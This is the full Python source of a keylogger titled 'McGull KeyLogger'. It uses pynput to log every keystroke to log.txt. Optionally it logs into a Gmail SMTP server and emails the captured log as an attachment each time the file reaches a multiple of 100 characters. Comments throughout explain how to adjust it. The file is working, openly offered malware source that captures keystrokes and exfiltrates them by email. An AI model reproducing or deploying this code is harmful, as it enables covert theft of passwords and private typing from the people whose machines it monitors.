#Import for the loggings module which comes with vanilla python will help with logging the information gathered onto a file, along with formatting. 
#Import for getpass a python module that allows input of a string "Password" and hides it 
#Import for smtplib to set up an email server and allow us to send emails of the text to ourselves 
#Import for the email module which comes with vanilla and help with managing emails 
import email, logging, getpass, smtplib, ssl

#Downloaded and imported "pynput", a python module which helps control and read mouse and keyboard devices.
from pynput import keyboard

#Other modules from email to help with the strucutre of the email but more importantly adding the attachment
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# :)
print ('''

  __  __       _____       _ _   _  __          _                                  
 |  \/  |     / ____|     | | | | |/ /         | |                                 
 | \  / | ___| |  __ _   _| | | | ' / ___ _   _| |     ___   __ _  __ _  ___ _ __  
 | |\/| |/ __| | |_ | | | | | | |  < / _ \ | | | |    / _ \ / _` |/ _` |/ _ \ '__| 
 | |  | | (__| |__| | |_| | | | | . \  __/ |_| | |___| (_) | (_| | (_| |  __/ |    
 |_|  |_|\___|\_____|\__,_|_|_| |_|\_\___|\__, |______\___/ \__, |\__, |\___|_|    
                                           __/ |             __/ | __/ |           
                                          |___/             |___/ |___/            

''')
Decision = ''
i = 0
while i == 0: 
    Decision = input("Would you like the logger to send you an email periodically with the logs? (y/n): ")
    if Decision == 'y' or Decision == 'n':
        i = 1
    else:
        i = 0

if Decision == 'y':
    #Ask for email and password for future login. Its also important to note here that the password is using getpass which will hide the password from being show in plain text 
    email = input("Enter your email address here: ")
    password = getpass.getpass(prompt='Password: ', stream=None)

    #Setting up the server and starting it up
    #Logging in with creds we just asked for 
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    print("KeyLogger is now running... ")

    #Making the logger write to "log.txt", so all data gathered from the logger will be written and formatted there
    #Changing the level of logging from "WARNING"(the default level) to "DEBUG"
    #Formatting the file to show the line number first, then the ASC timestamp of whem the input what received, and then finally the input or "Message" that was received  
    logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(lineno)d:%(asctime)s:%(message)s')

    #Function:
    # On the key press first log the key into the file, read the file and assign temp to the contents
    #Every time the length of the file hits 100 the file will be sent to the email, then remove the contents from the file and start over
    def on_press(key):
        logging.debug(key)

        f = open('log.txt', 'r+')
        temp = f.read()
        #CHANGE THE 100 IF YOU WANT TO CHANGE HOW OFTEN IT SENDS YOU AN EMAIL
        if len(temp) % 100 == 0: 
            send_email()
            f.truncate(0)

    #Setting a var for the file 
    filename = 'log.txt'
    #Function: 
    #Setting up the email to send with an attachment
    def send_email():
        #Creating the "MultiPart" message (No need to set the other options)
        message = MIMEMultipart()

        #open file 
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

        #Encode message 
        encoders.encode_base64(part)

        #Add the attachment to the header. 
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )

        message.attach(part)
        text = message.as_string()
        server.sendmail(email, email, text)    

    #Turns on listener
    with keyboard.Listener(on_press=on_press) as listener: 
        listener.join() 
else:
    print("KeyLogger is now running... ")
    #Making the logger write to "log.txt", so all data gathered from the logger will be written and formatted there
    #Changing the level of logging from "WARNING"(the default level) to "DEBUG"
    #Formatting the file to show the line number first, then the ASC timestamp of whem the input what received, and then finally the input or "Message" that was received  
    logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(lineno)d:%(asctime)s:%(message)s')

    #Function:
    # On the key press first log the key into the file, read the file and assign temp to the contents
    def on_press(key):
        logging.info(key)

    #Turns on listener
    with keyboard.Listener(on_press=on_press) as listener: 
        listener.join() 


    



